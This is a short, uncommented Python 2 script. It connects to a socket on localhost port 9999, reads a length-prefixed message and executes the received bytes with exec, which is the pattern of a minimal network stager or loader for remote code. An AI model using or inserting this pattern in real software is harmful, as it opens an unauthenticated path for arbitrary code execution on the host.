import socket
import struct

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('localhost', 9999)
sock.connect(server_address)
length = struct.unpack(">I", sock.recv(4))[0]
message = sock.recv(length)
exec message


